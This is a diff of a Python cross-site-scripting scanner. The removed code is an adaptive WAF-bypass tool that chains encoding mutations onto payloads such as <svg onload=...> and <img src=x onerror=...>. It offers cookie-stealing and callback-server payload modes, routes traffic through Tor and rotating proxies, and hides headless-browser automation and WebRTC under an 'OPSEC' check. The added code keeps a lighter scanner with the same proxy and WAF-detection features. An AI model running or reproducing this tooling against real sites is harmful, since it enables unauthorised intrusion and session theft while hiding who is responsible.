-        if not self.proxies: return None
-        with self.lock:
-            if payload in self.assign:
-                p = self.assign[payload]
-                if p not in self.dead:
-                    return p
-                self.index += 1
-            ok = [p for p in self.proxies if p not in self.dead]
-            if not ok: return None
-            p = ok[self.index % len(ok)]
-            self.index += 1
-            self.assign[payload] = p
-            return p
+    def get_for(self, _payload: str = "") -> Optional[str]:
+        return self.get()
 
-    def assign_batch(self, payloads):
-        with self.lock:
-            ok = [p for p in self.proxies if p not in self.dead]
-            if not ok: return
-            n = len(ok)
-            self.assign.clear()
-            for i, pl in enumerate(payloads):
-                self.assign[pl] = ok[i % n]
-
-    def mark_dead(self, p):
-        with self.lock: self.dead.add(p)
-
-    def alive(self):
-        return len([p for p in self.proxies if p not in self.dead])
-
-    def total(self):
+    def __len__(self):
         return len(self.proxies)
 
 
-def ask_alert_type():
-    print(f"\n{C.GLD}+{'-'*62}+{C.R}")
-    print(f"{C.GLD}|{C.R}  {C.WHT}Alert type (payload PoC){C.R}")
-    print(f"{C.GLD}|{C.R}  {C.GLD}1{C.R}  alert('mk...mk')             {C.D}unique marker{C.R}")
-    print(f"{C.GLD}|{C.R}  {C.GLD}2{C.R}  alert(document.domain)       {C.D}professional{C.R}")
-    print(f"{C.GLD}|{C.R}  {C.GLD}3{C.R}  alert(document.cookie)       {C.D}deep PoC{C.R}")
-    print(f"{C.GLD}|{C.R}  {C.GLD}4{C.R}  alert(window.location.href)  {C.D}forensic{C.R}")
-    print(f"{C.GLD}|{C.R}  {C.GLD}5{C.R}  fetch to callback server     {C.D}blind XSS{C.R}")
-    print(f"{C.GLD}+{'-'*62}+{C.R}")
-    print(f"{C.GLD}>>{C.R} ", end="")
-    m = input().strip() or "2"
-    ALERT_TYPE["mode"] = {"1":"unique","2":"domain","3":"cookie","4":"location","5":"callback"}.get(m, "domain")
+def load_proxies_file(path: str) -> List[str]:
+    if not path or not os.path.isfile(path):
+        return []
+    out = []
+    with open(path, "r", encoding="utf-8", errors="ignore") as f:
+        for line in f:
+            p = normalize_proxy(line)
+            if p:
+                out.append(p)
+    return out
 
 
-def ask_proxies():
-    print(f"\n{C.NEO}Use proxies?{C.R} {C.D}(y/n){C.R}: ", end="")
-    if input().strip().lower() != "y":
+def ask_proxies() -> ProxyPool:
+    if not yn("Use proxies", False):
         return ProxyPool([])
-
-    print(f"\n{C.NEO}Proxy mode{C.R}")
-    print(f"  {C.GLD}1{C.R}  Tor (socks5://127.0.0.1:9050)")
-    print(f"  {C.GLD}2{C.R}  Load from file")
-    print(f"  {C.GLD}3{C.R}  Paste directly")
-    print(f"{C.GLD}>>{C.R} ", end="")
-    mode = input().strip() or "2"
-
-    proxies = []
-
+    box("Proxy source", [
+        ("1", "Tor  socks5://127.0.0.1:9050"),
+        ("2", "File path"),
+        ("3", "Paste lines (end with empty line)"),
+    ])
+    mode = prompt(">>", "2")
+    proxies: List[str] = []
     if mode == "1":
-        print(f"  {C.NEO}Testing Tor...{C.R}")
         tor = "socks5://127.0.0.1:9050"
+        status_line("testing Tor…", "info")
         try:
-            r = requests.get("https://check.torproject.org/api/ip",
-                             proxies={"http": tor, "https": tor},
-                             timeout=10, verify=False)
+            r = requests.get(
+                "https://check.torproject.org/api/ip",
+                proxies={"http": tor, "https": tor},
+                timeout=10,
+                verify=False,
+            )
             data = r.json()
             if data.get("IsTor"):
-                print(f"  {C.GRN}[+] Tor active - IP: {data.get('IP')}{C.R}")
+                status_line(f"Tor OK — {data.get('IP')}", "ok")
                 proxies = [tor]
             else:
-                print(f"  {C.CRM}[!] Not routed through Tor{C.R}")
-                return ProxyPool([])
+                status_line("not routed via Tor", "err")
         except Exception as e:
-            print(f"  {C.CRM}[!] Tor not running: {str(e)[:60]}{C.R}")
-            return ProxyPool([])
-
+            status_line(f"Tor down: {e}", "err")
     elif mode == "2":
-        path = input(f"{C.NEO}Proxy file path{C.R}: ").strip().strip('"').strip("'")
+        path = prompt("Proxy file").strip('"').strip("'")
         proxies = load_proxies_file(path)
-
+        status_line(f"loaded {len(proxies)} proxies", "ok" if proxies else "warn")
     else:
-        proxies = load_proxies_pasted()
-
-    if not proxies:
-        print(f"{C.CRM}[!] No proxies, running direct{C.R}")
-        return ProxyPool([])
-
-    print(f"\n{C.NEO}Validate before start?{C.R} {C.D}(y/n){C.R}: ", end="")
-    if input().strip().lower() == "y":
-        proxies = check_proxies(proxies)
-
-    if not proxies:
-        print(f"{C.CRM}[!] No alive proxies, running direct{C.R}")
-        return ProxyPool([])
-
-    print(f"  {C.GRN}[+] Pool ready: {len(proxies)} proxies{C.R}")
+        status_line("paste proxies, empty line to finish", "info")
+        while True:
+            try:
+                line = input()
+            except EOFError:
+                break
+            if not line.strip():
+                break
+            p = normalize_proxy(line)
+            if p:
+                proxies.append(p)
     return ProxyPool(proxies)
 
 
-def ask_browser_verify():
-    print(f"\n{C.GLD}+{'-'*62}+{C.R}")
-    print(f"{C.GLD}|{C.R}  {C.WHT}Confirm XSS with Playwright (real browser)?{C.R}")
-    print(f"{C.GLD}|{C.R}  {C.GRN}y{C.R} = yes (slower, accurate results)")
-    print(f"{C.GLD}|{C.R}  {C.CRM}n{C.R} = no  (faster, reflection only)")
-    print(f"{C.GLD}+{'-'*62}+{C.R}")
-    print(f"{C.GLD}>>{C.R} ", end="")
-    ans = input().strip().lower()
-    return ans == "y"
+# ── detection helpers ────────────────────────────────────────────────────────
+def detect_waf(text: str, headers: Dict[str, str]) -> Optional[str]:
+    blob = " ".join(f"{k}:{v}" for k, v in headers.items()) + "\n" + (text or "")[:4000]
+    blob_l = blob.lower()
+    for name, sigs in WAF_SIGS.items():
+        for s in sigs:
+            if re.search(s, blob_l):
+                return name
+    return None
 
 
-def detect_context(html, marker):
-    i = html.find(marker)
-    if i == -1: return None
-    b = html[max(0, i-200):i]
-    if re.search(r'<script[^>]*>[^<]*$', b, re.I): return "inside_js"
-    if re.search(r'on\w+\s*=\s*["\'][^"\']*$', b, re.I): return "inside_event"
-    if re.search(r'href\s*=\s*["\'][^"\']*$', b, re.I): return "inside_href"
-    if re.search(r'src\s*=\s*["\'][^"\']*$', b, re.I): return "inside_src"
-    if re.search(r'<[^>]*\s\w+\s*=\s*["\'][^"\']*$', b, re.I): return "inside_attr"
-    if re.search(r'<!--[^>]*$', b): return "inside_comment"
-    return "html_body"
+def reflection_kind(body: str, payload: str, marker: str) -> str:
+    if not body:
+        return "none"
+    if payload in body:
+        return "verbatim"
+    enc = _html.escape(payload)
+    if enc in body and payload not in body:
+        return "html-encoded"
+    if marker and marker in body:
+        return "partial-marker"
+    # loose: script-ish reflection
+    if re.search(re.escape(payload[:12]), body, re.I):
+        return "partial"
+    return "none"
 
 
-def real_severity(c):
-    if c in ("inside_js","inside_event"): return "HIGH"
-    if c in ("inside_href","inside_src","html_body","inside_attr"): return "MEDIUM"
-    return "LOW"
+def detect_context(html: str, marker: str) -> str:
+    if not html or not marker or marker not in html:
+        return "none"
+    idx = html.find(marker)
+    window = html[max(0, idx - 80): idx + 80]
+    if re.search(r"<script[^>]*>[^<]*" + re.escape(marker), window, re.I):
+        return "script"
+    if re.search(r"['\"][^'\"]*" + re.escape(marker), window):
+        return "attribute"
+    if re.search(r"<!--[^>]*" + re.escape(marker), window):
+        return "comment"
+    if re.search(r"<[^>]+" + re.escape(marker), window):
+        return "tag"
+    return "html-body"
 
 
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
-]
+def severity_for(reflection: str, context: str, confirmed: Optional[bool]) -> str:
+    if confirmed:
+        return "critical"
+    if reflection == "verbatim" and context in ("script", "attribute", "html-body"):
+        return "high"
+    if reflection in ("verbatim", "partial-marker"):
+        return "medium"
+    if reflection.startswith("partial"):
+        return "low"
+    return "info"
 
 
-def _parse_proxy_for_playwright(proxy):
-    try:
-        p = urlparse(proxy)
-        scheme = p.scheme or "http"
-        host = p.hostname
-        port = p.port
-        if not host or not port:
-            return {"server": proxy}
-        cfg = {"server": f"{scheme}://{host}:{port}"}
-        if p.username: cfg["username"] = p.username
-        if p.password: cfg["password"] = p.password
-        return cfg
-    except Exception:
-        return {"server": proxy}
-
-
-def verify_with_browser(url, field, payload, proxy=None, user_agent=None, timeout=8):
-    if not proxy:
-        print(f"  {C.CRM}[!] OPSEC: No proxy for browser verify - SKIPPED{C.R}")
+# ── browser verify (optional) ────────────────────────────────────────────────
+def verify_with_browser(url: str, timeout: float = 8.0) -> Optional[bool]:
+    if not HAS_PLAYWRIGHT:
         return None
-
-    try:
-        from playwright.sync_api import sync_playwright
-    except ImportError:
-        print(f"  {C.YEL}[!] Playwright not installed: pip install playwright{C.R}")
-        return None
-
-    hit = {"fired": False}
-    ua = user_agent or random.choice(USER_AGENTS)
-    proxy_cfg = _parse_proxy_for_playwright(proxy)
-
     try:
         with sync_playwright() as p:
-            browser = p.chromium.launch(
-                headless=True,
-                proxy=proxy_cfg,
-                args=[
-                    "--disable-blink-features=AutomationControlled",
-                    "--no-sandbox",
-                    "--disable-dev-shm-usage",
-                ],
-            )
-            ctx = browser.new_context(
-                user_agent=ua,
-                viewport={"width": 1366, "height": 768},
-                locale="en-US",
-                ignore_https_errors=True,
-            )
-            ctx.add_init_script("""
-                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
-                try { delete navigator.__proto__.webkitRTCPeerConnection; } catch(e) {}
-                try { window.RTCPeerConnection = undefined; } catch(e) {}
-            """)
+            browser = p.chromium.launch(headless=True)
+            page = browser.new_page()
+            dialogs = []
 
-            page = ctx.new_page()
-            page.on("dialog", lambda d: (hit.update(fired=True), d.dismiss()))
-            page.on("pageerror", lambda e: hit.update(fired=True))
+            def on_dialog(d):
+                dialogs.append(d.message)
+                d.dismiss()
 
-            p_url = urlparse(url)
-            q = parse_qs(p_url.query, keep_blank_values=True)
-            q[field] = [payload]
-            test_url = urlunparse(p_url._replace(query=urlencode(q, doseq=True)))
-
-            try:
-                page.goto(test_url, timeout=timeout * 1000, wait_until="domcontentloaded")
-                page.wait_for_timeout(1500)
-            except Exception:
-                pass
-
-            ctx.close()
+            page.on("dialog", on_dialog)
+            page.goto(url, wait_until="domcontentloaded", timeout=int(timeout * 1000))
+            page.wait_for_timeout(800)
             browser.close()
-    except Exception as e:
-        print(f"  {C.D}[?] Browser error: {str(e)[:80]}{C.R}")
+            return bool(dialogs)
+    except Exception:
         return None
 
-    return hit["fired"]
+
+# ── scanner core ─────────────────────────────────────────────────────────────
+@dataclass
+class Finding:
+    field: str
+    tag: str
+    payload: str
+    reflection: str
+    context: str
+    severity: str
+    status: int
+    waf: Optional[str] = None
+    confirmed: Optional[bool] = None
+    url: str = ""
+    evidence: str = ""
 
 
-class BypassScanner:
-    def __init__(self, url, method="GET", data=None, pool=None,
-                 threads=5, delay=0.2, timeout=10, batch_size=0):
-        parsed = urlparse(url)
-        if parsed.scheme not in ("http","https") or not parsed.netloc:
-            raise ValueError("Invalid URL")
-        self.url = url
+class XSSScanner:
+    def __init__(
+        self,
+        url: str,
+        method: str = "GET",
+        data: Optional[Dict[str, str]] = None,
+        fields: Optional[List[str]] = None,
+        pool: Optional[ProxyPool] = None,
+        threads: int = 6,
+        delay: float = 0.15,
+        timeout: float = 10.0,
+        browser_verify: bool = False,
+    ):
+        self.url, self.fields, self.data = ensure_fields(url, method, data)
+        if fields:
+            self.fields = fields
         self.method = method.upper()
-        self.base_data = dict(data or {})
         self.pool = pool or ProxyPool([])
-        self.threads = max(1, min(20, int(threads)))
+        self.threads = max(1, min(32, int(threads)))
         self.delay = max(0.0, float(delay))
         self.timeout = float(timeout)
-        self.batch_size = int(batch_size)
-
-        if self.method == "GET":
-            params = parse_qs(parsed.query, keep_blank_values=True)
-            self.fields = list(params.keys()) if params else list(self.base_data.keys())
-        else:
-            self.fields = list(self.base_data.keys())
-        if not self.fields: raise ValueError("No fields")
-
-        self.results = []
+        self.browser_verify = browser_verify
+        self.marker = make_marker()
+        self.results: List[Finding] = []
         self.lock = threading.Lock()
-        self.counter = {"sent":0,"errors":0,"ok":0,"blocked":0,"reflected":0,"verified":0}
-        self.waf_hits = {}
-        self.marker = "mk" + "".join(random.choices(string.ascii_lowercase, k=6)) + "mk"
-        self.last = 0.0
-        self.rl_lock = threading.Lock()
+        self.stats = {"sent": 0, "errors": 0, "reflected": 0, "verified": 0, "blocked": 0}
+        self._last = 0.0
+        self._rl = threading.Lock()
 
     def _rate(self):
-        with self.rl_lock:
+        with self._rl:
             now = time.monotonic()
-            slot = max(now, self.last + self.delay)
-            self.last = slot
+            slot = max(now, self._last + self.delay)
+            self._last = slot
         w = slot - time.monotonic()
-        if w > 0: time.sleep(w)
+        if w > 0:
+            time.sleep(w)
 
-    def _build(self, field, payload):
+    def _build(self, field: str, payload: str) -> Tuple[str, Optional[Dict[str, str]]]:
         if self.method == "GET":
-            p = urlparse(self.url)
-            q = parse_qs(p.query, keep_blank_values=True)
-            q[field] = [payload]
-            return urlunparse(p._replace(query=urlencode(q, doseq=True))), None
-        d = dict(self.base_data); d[field] = payload
-        return self.url, d
+            return inject_param(self.url, field, payload), None
+        body = dict(self.data)
+        body[field] = payload
+        return self.url, body
 
-    def _one(self, field, payload, tag):
+    def _request(self, field: str, payload: str) -> Tuple[Optional[Any], str, Optional[Dict]]:
         self._rate()
         proxy = self.pool.get_for(payload)
         pd = {"http": proxy, "https": proxy} if proxy else None
-        target, data = self._build(field, payload)
-        h = {"User-Agent": random.choice(USER_AGENTS)}
-
-        last = None
-        for _ in range(2):
-            with self.lock: self.counter["sent"] += 1
-            try:
-                if self.method == "GET":
-                    r = requests.get(target, proxies=pd, timeout=self.timeout,
-                                     verify=False, allow_redirects=False, headers=h)
-                else:
-                    r = requests.post(target, data=data, proxies=pd, timeout=self.timeout,
-                                      verify=False, allow_redirects=False, headers=h)
-
-                if r.status_code in (403,406,429,503):
-                    with self.lock:
-                        self.counter["blocked"] += 1
-                        self.waf_hits[tag] = self.waf_hits.get(tag, 0) + 1
-                    continue
-
-                with self.lock: self.counter["ok"] += 1
-
-                ctx = None; ev = None; reflected = False
-                if payload in r.text:
-                    reflected = True
-                    ctx = detect_context(r.text, payload)
-                    i = r.text.find(payload)
-                    ev = r.text[max(0, i-30):i+len(payload)+30]
-                elif self.marker in r.text:
-                    ctx = detect_context(r.text, self.marker)
-                    i = r.text.find(self.marker)
-                    ev = r.text[max(0, i-30):i+len(self.marker)+30]
-
-                if reflected:
-                    with self.lock: self.counter["reflected"] += 1
-                    sev = real_severity(ctx)
-                    confirmed = None
-
-                    if sev == "HIGH" and self.method == "GET" and USE_BROWSER_VERIFY["enabled"]:
-                        print(f"  {C.GLD}[?] Verifying with browser (proxy: {proxy})...{C.R}")
-                        confirmed = verify_with_browser(
-                            self.url, field, payload,
-                            proxy=proxy, user_agent=h["User-Agent"]
-                        )
-                        if confirmed is True:
-                            with self.lock: self.counter["verified"] += 1
-                            print(f"  {C.GRN}[+] CONFIRMED XSS!{C.R}")
-                        elif confirmed is False:
-                            print(f"  {C.YEL}[-] Reflection only (not executed){C.R}")
-                        else:
-                            print(f"  {C.D}[?] Verification skipped/error{C.R}")
-
-                    entry = {"tag":tag,"field":field,"method":self.method,"payload":payload,
-                             "context":ctx,"status":r.status_code,"severity":sev,
-                             "evidence":ev,"confirmed":confirmed,"proxy":proxy}
-                    with self.lock: self.results.append(entry)
-                    last = entry
-
-            except requests.exceptions.ProxyError:
-                if proxy: self.pool.mark_dead(proxy)
-                with self.lock: self.counter["errors"] += 1
-                break
-            except requests.exceptions.Timeout:
-                with self.lock: self.counter["errors"] += 1
-            except Exception:
-                with self.lock: self.counter["errors"] += 1
-        return last
-
-    def _manual_loop(self, tasks, on_result=None):
-        print(f"\n{C.GLD}Manual: Enter=send, a=auto-all, q=quit{C.R}\n")
-        auto = False
-        for i, (field, payload, tag) in enumerate(tasks, 1):
-            if not auto:
-                print(f"{C.NEO}[{i}/{len(tasks)}]{C.R} {C.WHT}{tag[:60]}{C.R}")
-                print(f"     {C.CYN}{payload[:120]}{C.R}")
-                cmd = input(f"{C.GLD}[Enter/a/q]{C.R}: ").strip().lower()
-                if cmd == "q": break
-                if cmd == "a": auto = True
-            res = self._one(field, payload, tag)
-            if res and on_result: on_result(res)
-
-    def scan(self, on_result=None, manual=False):
-        print(f"  {C.NEO}Generating mega-mix payloads...{C.R}")
-        bases = base_payloads(self.marker)
-        all_v = []
-        per_base = max(20, 800 // len(bases))
-        for b in bases:
-            all_v.extend(generate_mixed(b, max_count=per_base))
-        random.shuffle(all_v)
-
-        tasks_all = [(f, p, t) for f in self.fields for t, p in all_v]
-        total = len(tasks_all)
-        n_proxies = self.pool.total()
-
-        print(f"  {C.GRN}[+] {len(all_v)} unique payloads x {len(self.fields)} fields = {total} payloads{C.R}")
-        print(f"  {C.NEO}Fields:{C.R} {', '.join(self.fields)}")
-        print(f"  {C.NEO}Proxies:{C.R} {n_proxies} (alive: {self.pool.alive()})")
-        print(f"  {C.NEO}Delay:{C.R} {self.delay}s")
-
-        if manual:
-            self._manual_loop(tasks_all, on_result)
-            return self.results
-
-        if n_proxies > 0:
-            chunks = [tasks_all[i:i+n_proxies] for i in range(0, total, n_proxies)]
-            print(f"  {C.NEO}Rounds:{C.R} {len(chunks)} (each round = {n_proxies} payloads on {n_proxies} proxies, 2x each)\n")
-            for r_idx, chunk in enumerate(chunks, 1):
-                payloads = [p for _, p, _ in chunk]
-                self.pool.assign_batch(payloads)
-                print(f"\n{C.GLD}--- Round {r_idx}/{len(chunks)} ({len(chunk)} payloads, 2x each = {len(chunk)*2} req) ---{C.R}")
-                with ThreadPoolExecutor(max_workers=self.threads) as ex:
-                    futures = [ex.submit(self._one, f, p, t) for f, p, t in chunk]
-                    for fut in as_completed(futures):
-                        try:
-                            res = fut.result()
-                            if res and on_result: on_result(res)
-                        except Exception:
-                            with self.lock: self.counter["errors"] += 1
-                if self.pool.alive() == 0:
-                    print(f"{C.CRM}[!] All proxies dead{C.R}"); break
-                print(f"{C.D}  stats: sent={self.counter['sent']} ok={self.counter['ok']} "
-                      f"blocked={self.counter['blocked']} found={len(self.results)} verified={self.counter['verified']}{C.R}")
-        else:
-            if self.batch_size > 0:
-                print(f"  {C.NEO}Batch:{C.R} {self.batch_size} per round\n")
-                for i in range(0, total, self.batch_size):
-                    chunk = tasks_all[i:i+self.batch_size]
-                    print(f"\n{C.GLD}--- Batch {i//self.batch_size + 1} ({len(chunk)} payloads, 2x each) ---{C.R}")
-                    with ThreadPoolExecutor(max_workers=self.threads) as ex:
-                        futures = [ex.submit(self._one, f, p, t) for f, p, t in chunk]
-                        for fut in as_completed(futures):
-                            try:
-                                res = fut.result()
-                                if res and on_result: on_result(res)
-                            except Exception:
-                                with self.lock: self.counter["errors"] += 1
-                    print(f"{C.D}  stats: sent={self.counter['sent']} ok={self.counter['ok']} "
-                          f"blocked={self.counter['blocked']} found={len(self.results)}{C.R}")
-            else:
-                print(f"  {C.NEO}Estimated: ~{total * self.delay * 2:.0f}s{C.R}\n")
-                with ThreadPoolExecutor(max_workers=self.threads) as ex:
-                    futures = [ex.submit(self._one, f, p, t) for f, p, t in tasks_all]
-                    for fut in as_completed(futures):
-                        try:
-                            res = fut.result()
-                            if res and on_result: on_result(res)
-                        except Exception:
-                            with self.lock: self.counter["errors"] += 1
-        return self.results
-
-
-class AdaptiveBypass:
-    def __init__(self, url, method="GET", data=None, pool=None,
-                 threads=5, delay=0.3, timeout=10):
-        self.url = url
-        self.method = method.upper()
-        self.base_data = dict(data or {})
-        self.pool = pool or ProxyPool([])
-        self.threads = max(1, min(20, int(threads)))
-        self.delay = max(0.0, float(delay))
-        self.timeout = float(timeout)
-
-        if self.method == "GET":
-            parsed = urlparse(url)
-            params = parse_qs(parsed.query, keep_blank_values=True)
-            self.fields = list(params.keys()) if params else list(self.base_data.keys())
-        else:
-            self.fields = list(self.base_data.keys())
-        if not self.fields: raise ValueError("No fields")
-
-        self.field = self.fields[0]
-        self.marker = "mk" + "".join(random.choices(string.ascii_lowercase, k=6)) + "mk"
-        self.results = []
-        self.lock = threading.Lock()
-        self.counter = {"sent":0,"ok":0,"blocked":0,"errors":0,"reflected":0,"verified":0}
-        self.working = []
-        self.blocked_list = []
-        self.last = 0.0
-
-    def _rate(self):
+        target, body = self._build(field, payload)
+        headers = {"User-Agent": random.choice(USER_AGENTS)}
         with self.lock:
-            now = time.monotonic()
-            slot = max(now, self.last + self.delay)
-            self.last = slot
-        w = slot - time.monotonic()
-        if w > 0: time.sleep(w)
-
-    def _build(self, field, payload):
-        if self.method == "GET":
-            p = urlparse(self.url)
-            q = parse_qs(p.query, keep_blank_values=True)
-            q[field] = [payload]
-            return urlunparse(p._replace(query=urlencode(q, doseq=True))), None
-        d = dict(self.base_data); d[field] = payload
-        return self.url, d
-
-    def _one(self, payload, tag="probe"):
-        self._rate()
-        proxy = self.pool.get_for(payload)
-        pd = {"http": proxy, "https": proxy} if proxy else None
-        target, data = self._build(self.field, payload)
-        h = {"User-Agent": random.choice(USER_AGENTS)}
-
-        last = None
-        for _ in range(2):
-            with self.lock: self.counter["sent"] += 1
-            try:
-                if self.method == "GET":
-                    r = requests.get(target, proxies=pd, timeout=self.timeout,
-                                     verify=False, allow_redirects=False, headers=h)
-                else:
-                    r = requests.post(target, data=data, proxies=pd, timeout=self.timeout,
-                                      verify=False, allow_redirects=False, headers=h)
-
-                blocked = r.status_code in (403, 406, 429, 503)
-                if blocked:
-                    with self.lock: self.counter["blocked"] += 1
-                    last = {"status": r.status_code, "blocked": True,
-                            "reflected": False, "context": None,
-                            "payload": payload, "tag": tag}
-                    continue
-
-                with self.lock: self.counter["ok"] += 1
-
-                reflected = payload in r.text or self.marker in r.text
-                ctx = None
-                if reflected:
-                    key = payload if payload in r.text else self.marker
-                    ctx = detect_context(r.text, key)
-                    with self.lock: self.counter["reflected"] += 1
-
-                last = {"status": r.status_code, "blocked": False,
-                        "reflected": reflected, "context": ctx,
-                        "payload": payload, "tag": tag}
-
-                if reflected and real_severity(ctx) == "HIGH" and self.method == "GET" and proxy and USE_BROWSER_VERIFY["enabled"]:
-                    print(f"  {C.GLD}[?] Verifying with browser...{C.R}")
-                    confirmed = verify_with_browser(
-                        self.url, self.field, payload,
-                        proxy=proxy, user_agent=h["User-Agent"]
-                    )
-                    last["confirmed"] = confirmed
-                    if confirmed is True:
-                        with self.lock: self.counter["verified"] += 1
-                        print(f"  {C.GRN}[+] CONFIRMED XSS!{C.R}")
-                    elif confirmed is False:
-                        print(f"  {C.YEL}[-] Reflection only{C.R}")
-
-            except requests.exceptions.ProxyError:
-                if proxy: self.pool.mark_dead(proxy)
-                with self.lock: self.counter["errors"] += 1
-                last = {"status":0,"blocked":False,"reflected":False,
-                        "context":None,"payload":payload,"tag":tag,"error":"proxy"}
-                break
-            except Exception:
-                with self.lock: self.counter["errors"] += 1
-                last = {"status":0,"blocked":False,"reflected":False,
-                        "context":None,"payload":payload,"tag":tag,"error":"exc"}
-        return last
-
-    def _add_finding(self, tag, payload, ctx, status, confirmed=None):
-        entry = {"tag": tag, "field": self.field, "method": self.method,
-                 "payload": payload, "context": ctx, "status": status,
-                 "severity": real_severity(ctx), "evidence": None,
-                 "confirmed": confirmed}
-        with self.lock: self.results.append(entry)
-
-    def _probe_base(self):
-        print(f"  {C.NEO}Probing baseline...{C.R}")
-        base = f"<script>{get_alert(self.marker)}</script>"
-        r = self._one(base, "baseline")
-        if r.get("blocked"):
-            print(f"  {C.YEL}[!] Baseline BLOCKED ({r['status']}) - WAF active{C.R}")
-            return False
-        if r.get("reflected"):
-            print(f"  {C.GRN}[+] Baseline REFLECTED - XSS likely{C.R}")
-            self._add_finding("baseline", base, r["context"], r["status"], r.get("confirmed"))
-            return True
-        print(f"  {C.GRN}[+] Baseline passed (no reflection){C.R}")
-        return True
-
-    def _probe_techniques(self):
-        print(f"\n  {C.NEO}Probing {len(MUTATIONS)} techniques...{C.R}\n")
-        base = f"<svg onload={get_alert(self.marker)}>"
-        items = list(MUTATIONS.items())
-        random.shuffle(items)
-
-        for i, (name, fn) in enumerate(items, 1):
-            try: mutated = fn(base)
-            except Exception: continue
-            r = self._one(mutated, name)
-            if r.get("blocked"):
-                self.blocked_list.append(name)
-                print(f"  {C.CRM}[{i:>2}/{len(items)}] {name:<15} -> BLOCKED ({r['status']}){C.R}")
-            elif r.get("error"):
-                print(f"  {C.D}[{i:>2}/{len(items)}] {name:<15} -> error{C.R}")
+            self.stats["sent"] += 1
+        try:
+            if self.method == "GET":
+                r = requests.get(
+                    target, headers=headers, proxies=pd, timeout=self.timeout,
+                    verify=False, allow_redirects=True,
+                )
             else:
-                self.working.append(name)
-                ref = "REFLECTED" if r.get("reflected") else "passed"
-                print(f"  {C.GRN}[{i:>2}/{len(items)}] {name:<15} -> OK ({ref}){C.R}")
-                if r.get("reflected"):
-                    self._add_finding(name, mutated, r["context"], r["status"], r.get("confirmed"))
-        return self.working
+                r = requests.post(
+                    target, data=body, headers=headers, proxies=pd, timeout=self.timeout,
+                    verify=False, allow_redirects=True,
+                )
+            return r, target, body
+        except Exception:
+            with self.lock:
+                self.stats["errors"] += 1
+            return None, target, body
 
-    def _chain_working(self):
-        if len(self.working) < 2: return
-        print(f"\n  {C.NEO}Chaining working techniques...{C.R}\n")
-        import itertools
-        base = f"<img src=x onerror={get_alert(self.marker)}>"
-        pairs = list(itertools.combinations(self.working, 2))
-        random.shuffle(pairs)
-        pairs = pairs[:40]
+    def _analyze(self, field: str, tag: str, payload: str, r, target: str) -> Optional[Finding]:
+        if r is None:
+            return None
+        text = r.text or ""
+        headers = {k: v for k, v in r.headers.items()}
+        waf = detect_waf(text, headers)
+        if waf and r.status_code in (403, 406, 429, 503):
+            with self.lock:
+                self.stats["blocked"] += 1
+        kind = reflection_kind(text, payload, self.marker)
+        if kind == "none":
+            return None
+        with self.lock:
+            self.stats["reflected"] += 1
+        ctx = detect_context(text, self.marker if self.marker in text else payload[:16])
+        confirmed = None
+        if self.browser_verify and kind == "verbatim":
+            confirmed = verify_with_browser(target)
+            if confirmed:
+                with self.lock:
+                    self.stats["verified"] += 1
+        sev = severity_for(kind, ctx, confirmed)
+        evidence = ""
+        needle = self.marker if self.marker in text else payload[:24]
+        idx = text.find(needle)
+        if idx >= 0:
+            evidence = text[max(0, idx - 40): idx + len(needle) + 40].replace("\n", " ")
+        return Finding(
+            field=field, tag=tag, payload=payload, reflection=kind, context=ctx,
+            severity=sev, status=r.status_code, waf=waf, confirmed=confirmed,
+            url=target, evidence=evidence,
+        )
 
-        for i, combo in enumerate(pairs, 1):
-            try: mutated = chain(base, list(combo))
-            except Exception: continue
-            r = self._one(mutated, "+".join(combo))
-            if not r.get("blocked") and not r.get("error"):
-                ref = "REFLECTED" if r.get("reflected") else "passed"
-                print(f"  {C.GRN}[{i:>2}/{len(pairs)}] {'+'.join(combo):<40} -> OK ({ref}){C.R}")
-                if r.get("reflected"):
-                    self._add_finding("+".join(combo), mutated, r["context"], r["status"], r.get("confirmed"))
+    def scan(self, payloads: List[Tuple[str, str]]) -> List[Finding]:
+        jobs = [(f, t, p) for f in self.fields for t, p in payloads]
+        status_line(
+            f"{len(self.fields)} field(s) × {len(payloads)} payload(s) = {len(jobs)} probes  "
+            f"threads={self.threads} delay={self.delay}s",
+            "info",
+        )
+        status_line(f"marker={self.marker}", "info")
 
-    def _escalate(self):
-        print(f"\n  {C.NEO}Escalating with heavy combos...{C.R}\n")
-        bases = base_payloads(self.marker)
-        heavy_sets = [
-            ["case","whitespace","html_entity","hex_js"],
-            ["percent","double_pct","unicode","slash"],
-            ["js_fragment","bracket","atob","case"],
-            ["tag_break","attr_break","slash","case","whitespace"],
-            ["null_byte","percent","hex_js","js_fragment"],
-            ["case","html_entity","bracket","atob","space_slash"],
-            ["hex_entity","unicode_js","optional_chain","case"],
-        ]
-        for i, techs in enumerate(heavy_sets, 1):
-            for base in random.sample(bases, min(3, len(bases))):
-                try: mutated = chain(base, techs)
-                except Exception: continue
-                r = self._one(mutated, "+".join(techs))
-                if not r.get("blocked") and not r.get("error"):
-                    ref = "REFLECTED" if r.get("reflected") else "passed"
-                    print(f"  {C.GRN}[{i}] {'+'.join(techs)[:55]:<55} -> OK ({ref}){C.R}")
-                    if r.get("reflected"):
-                        self._add_finding("+".join(techs), mutated, r["context"], r["status"], r.get("confirmed"))
+        def work(item):
+            field, tag, payload = item
+            # embed marker in payload when unique mode already has it; else append as comment for tracking
+            r, target, _ = self._request(field, payload)
+            return self._analyze(field, tag, payload, r, target)
 
-    def scan(self, on_result=None):
-        print(f"\n  {C.PUR}{'-'*60}{C.R}")
-        print(f"  {C.B}{C.WHT}ADAPTIVE BYPASS MODE{C.R}")
-        print(f"  {C.PUR}{'-'*60}{C.R}\n")
-        print(f"  {C.NEO}Target:{C.R} {self.url}")
-        print(f"  {C.NEO}Method:{C.R} {self.method}")
-        print(f"  {C.NEO}Field: {C.R}{self.field}")
-        print(f"  {C.NEO}Marker:{C.R} {self.marker}")
-        print(f"  {C.NEO}Alert: {C.R}{ALERT_TYPE['mode']}")
-        print(f"  {C.NEO}Proxy: {C.R}{self.pool.alive()}/{self.pool.total()} alive")
-        print(f"  {C.NEO}Delay: {C.R}{self.delay}s\n")
-
-        self._probe_base()
-        self._probe_techniques()
-
